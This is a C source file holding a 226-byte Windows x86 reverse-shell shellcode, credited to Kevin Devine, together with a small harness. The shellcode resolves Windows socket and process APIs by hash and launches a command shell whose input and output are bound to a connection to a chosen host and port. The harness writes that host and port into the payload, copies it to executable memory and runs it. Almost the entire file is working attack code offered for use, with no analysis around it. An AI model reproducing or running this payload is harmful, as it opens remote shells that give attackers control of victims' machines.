
#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

/* Copyright (c) 2014 Kevin Devine */
/* Size = 226 bytes */

char rev_overlap32[] = {
  /* 0000 */  "\x60"                              /*  pushad                                   */
  /* 0001 */  "\xEB\x65"                          /*  jmp 00000068h                            */
  /* 0003 */  "\x5E"                              /*  pop esi                                  */
  /* 0004 */  "\x8D\x6E\x1C"                      /*  lea ebp, dword ptr [esi+1Ch]             */
  /* 0007 */  "\x33\xC0"                          /*  xor eax, eax                             */
  /* 0009 */  "\x99"                              /*  cdq                                      */
  /* 000A */  "\xB2\x58"                          /*  mov dl, 58h                              */
  /* 000C */  "\x2B\xE2"                          /*  sub esp, edx                             */
  /* 000E */  "\x8B\xFC"                          /*  mov edi, esp                             */
  /* 0010 */  "\x8B\xCA"                          /*  mov ecx, edx                             */
  /* 0012 */  "\xF3\xAA"                          /*  rep stosb                                */
  /* 0014 */  "\x6A\x01"                          /*  push 00000001h                           */
  /* 0016 */  "\x6A\x02"                          /*  push 00000002h                           */
  /* 0018 */  "\xFF\xD5"                          /*  call ebp                                 */
  /* 001A */  "\x93"                              /*  xchg eax, ebx                            */
  /* 001B */  "\x8B\xFC"                          /*  mov edi, esp                             */
  /* 001D */  "\x6A\x10"                          /*  push 00000010h                           */
  /* 001F */  "\x57"                              /*  push edi                                 */
  /* 0020 */  "\x53"                              /*  push ebx                                 */
  /* 0021 */  "\xAD"                              /*  lodsd                                    */
  /* 0022 */  "\xF7\xD0"                          /*  not eax                                  */
  /* 0024 */  "\xAB"                              /*  stosd                                    */
  /* 0025 */  "\xAD"                              /*  lodsd                                    */
  /* 0026 */  "\xF7\xD0"                          /*  not eax                                  */
  /* 0028 */  "\xAB"                              /*  stosd                                    */
  /* 0029 */  "\xFF\xD5"                          /*  call ebp                                 */
  /* 002B */  "\x8B\xFC"                          /*  mov edi, esp                             */
  /* 002D */  "\x6A\x44"                          /*  push 00000044h                           */
  /* 002F */  "\x8F\x07"                          /*  pop dword ptr [edi]                      */
  /* 0031 */  "\x89\x47\x04"                      /*  mov dword ptr [edi+04h], eax             */
  /* 0034 */  "\xFF\x47\x2D"                      /*  inc dword ptr [edi+2Dh]                  */
  /* 0037 */  "\x93"                              /*  xchg eax, ebx                            */
  /* 0038 */  "\x8D\x7F\x38"                      /*  lea edi, dword ptr [edi+38h]             */
  /* 003B */  "\xAB"                              /*  stosd                                    */
  /* 003C */  "\xAB"                              /*  stosd                                    */
  /* 003D */  "\xAB"                              /*  stosd                                    */
  /* 003E */  "\x93"                              /*  xchg eax, ebx                            */
  /* 003F */  "\xB8\x9C\x92\x9B\xFF"              /*  mov eax, FF9B929Ch                       */
  /* 0044 */  "\xF7\xD0"                          /*  not eax                                  */
  /* 0046 */  "\x99"                              /*  cdq                                      */
  /* 0047 */  "\x8B\xCF"                          /*  mov ecx, edi                             */
  /* 0049 */  "\xAB"                              /*  stosd                                    */
  /* 004A */  "\x8B\xC4"                          /*  mov eax, esp                             */
  /* 004C */  "\x50"                              /*  push eax                                 */
  /* 004D */  "\x50"                              /*  push eax                                 */
  /* 004E */  "\x52"                              /*  push edx                                 */
  /* 004F */  "\x52"                              /*  push edx                                 */
  /* 0050 */  "\x52"                              /*  push edx                                 */
  /* 0051 */  "\x51"                              /*  push ecx                                 */
  /* 0052 */  "\x52"                              /*  push edx                                 */
  /* 0053 */  "\x52"                              /*  push edx                                 */
  /* 0054 */  "\x51"                              /*  push ecx                                 */
  /* 0055 */  "\x52"                              /*  push edx                                 */
  /* 0056 */  "\xFF\xD5"                          /*  call ebp                                 */
  /* 0058 */  "\x8B\x04\x24"                      /*  mov eax, dword ptr [esp]                 */
  /* 005B */  "\x6A\xFF"                          /*  push FFFFFFFFh                           */
  /* 005D */  "\x50"                              /*  push eax                                 */
  /* 005E */  "\xFF\xD5"                          /*  call ebp                                 */
  /* 0060 */  "\x53"                              /*  push ebx                                 */
  /* 0061 */  "\xFF\xD5"                          /*  call ebp                                 */
  /* 0063 */  "\x83\xC4\x48"                      /*  add esp, 48h                             */
  /* 0066 */  "\x61"                              /*  popad                                    */
  /* 0067 */  "\xC3"                              /*  ret                                      */
  /* 0068 */  "\xE8\x96\xFF\xFF\xFF"              /*  call 00000003h                           */
  
  /* 006D */  "\xB2\xA5\xC1\x87"                  /*  WSASocketA                               */
  
  /* 0071 */  "\x00\x00\x00\x00"                  /*  sockaddr_in without sin_zero field       */
  /* 0075 */  "\x00\x00\x00\x00"
  
  /* 0079 */  "\xEC\x80\x9C\xE4"                  /*  connect                                  */
  /* 007D */  "\xFE\xDF\x72\x17"                  /*  CreateProcessA                           */
  /* 0081 */  "\x4B\xDA\x38\x53"                  /*  WaitForSingleObject                      */
  /* 0085 */  "\x6E\xED\xCD\xA2"                  /*  closesocket                              */
  
  /* 0089 */  "\xAD"                              /*  lodsd                                    */
  /* 008A */  "\x60"                              /*  pushad                                   */
  /* 008B */  "\x6A\x30"                          /*  push 00000030h                           */
  /* 008D */  "\x5E"                              /*  pop esi                                  */
  /* 008E */  "\x64\xAD"                          /*  lodsd                                    */
  /* 0090 */  "\x8B\x40\x0C"                      /*  mov eax, dword ptr [eax+0Ch]             */
  /* 0093 */  "\x8B\x70\x1C"                      /*  mov esi, dword ptr [eax+1Ch]             */
  /* 0096 */  "\x8B\x6E\x08"                      /*  mov ebp, dword ptr [esi+08h]             */
  /* 0099 */  "\xAD"                              /*  lodsd                                    */
  /* 009A */  "\x50"                              /*  push eax                                 */
  /* 009B */  "\x8B\x45\x3C"                      /*  mov eax, dword ptr [ebp+3Ch]             */
  /* 009E */  "\x8B\x44\x28\x78"                  /*  mov eax, dword ptr [eax+ebp+78h]         */
  /* 00A2 */  "\x8D\x74\x28\x18"                  /*  lea esi, dword ptr [eax+ebp+18h]         */
  /* 00A6 */  "\xAD"                              /*  lodsd                                    */
  /* 00A7 */  "\x91"                              /*  xchg eax, ecx                            */
  /* 00A8 */  "\xE3\xEC"                          /*  jecxz 00000096h                          */
  /* 00AA */  "\xAD"                              /*  lodsd                                    */
  /* 00AB */  "\x03\xC5"                          /*  add eax, ebp                             */
  /* 00AD */  "\x50"                              /*  push eax                                 */
  /* 00AE */  "\xAD"                              /*  lodsd                                    */
  /* 00AF */  "\x8D\x3C\x28"                      /*  lea edi, dword ptr [eax+ebp]             */
  /* 00B2 */  "\xAD"                              /*  lodsd                                    */
  /* 00B3 */  "\x8D\x1C\x28"                      /*  lea ebx, dword ptr [eax+ebp]             */
  /* 00B6 */  "\x8B\x74\x8F\xFC"                  /*  mov esi, dword ptr [edi+ecx*4-04h]       */
  /* 00BA */  "\x03\xF5"                          /*  add esi, ebp                             */
  /* 00BC */  "\x33\xC0"                          /*  xor eax, eax                             */
  /* 00BE */  "\x99"                              /*  cdq                                      */
  /* 00BF */  "\xAC"                              /*  lodsb                                    */
  /* 00C0 */  "\x03\xD0"                          /*  add edx, eax                             */
  /* 00C2 */  "\xC1\xC2\x07"                      /*  rol edx, 07h                             */
  /* 00C5 */  "\x33\xD0"                          /*  xor edx, eax                             */
  /* 00C7 */  "\x48"                              /*  dec eax                                  */
  /* 00C8 */  "\x79\xF5"                          /*  jns 000000BFh                            */
  /* 00CA */  "\x3B\x54\x24\x24"                  /*  cmp edx, dword ptr [esp+24h]             */
  /* 00CE */  "\xE0\xE6"                          /*  loopne 000000B6h                         */
  /* 00D0 */  "\x58"                              /*  pop eax                                  */
  /* 00D1 */  "\x5E"                              /*  pop esi                                  */
  /* 00D2 */  "\x75\xC2"                          /*  jne 00000096h                            */
  /* 00D4 */  "\x0F\xB7\x14\x4B"                  /*  movzx edx, word ptr [ebx+ecx*2]          */
  /* 00D8 */  "\x03\x2C\x90"                      /*  add ebp, dword ptr [eax+edx*4]           */
  /* 00DB */  "\x89\x6C\x24\x1C"                  /*  mov dword ptr [esp+1Ch], ebp             */
  /* 00DF */  "\x61"                              /*  popad                                    */
  /* 00E0 */  "\xFF\xE0"                          /*  jmp eax                                  */
};

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 3) {
    printf ("\nUsage: rev_overlap32_test <host> <port>");
    printf ("\nExample: rev_overlap32_test localhost 80\n");
    return 0;
  }
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  sockaddr_in *p = (sockaddr_in*)&rev_overlap32[0x71];
  in_addr_t ip = ~resolve (argv[1]);
  
  memcpy (&p->sin_addr, &ip, sizeof (ip));
  p->sin_port   = ~htons (atoi(argv[2]));
  p->sin_family = ~AF_INET;
  
  void *exec = VirtualAlloc(0, strlen (rev_overlap32), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, rev_overlap32, strlen (rev_overlap32));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

